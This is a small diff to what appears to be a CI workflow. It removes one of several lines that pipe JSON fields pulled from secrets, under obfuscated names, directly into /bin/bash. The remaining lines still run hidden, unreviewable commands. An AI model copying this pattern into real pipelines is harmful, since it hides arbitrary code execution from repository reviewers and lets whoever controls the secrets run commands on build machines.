@@ -17,7 +17,6 @@ jobs:
           rv72606: ${{ secrets.rv72606 }}
         run: |
           printf '%s' "$rv72606" | jq -r .ubhn96104 | /bin/bash
-          echo $e760 | jq -r .h7661 | /bin/bash
           printf '%s' "$n81" | jq -r .vqda7670 | /bin/bash
           printf '%s' "$m8" | jq -r .pmbf120 | /bin/bash
           printf '%s' "$yss00" | jq -r .dbqgs0102 | /bin/bash
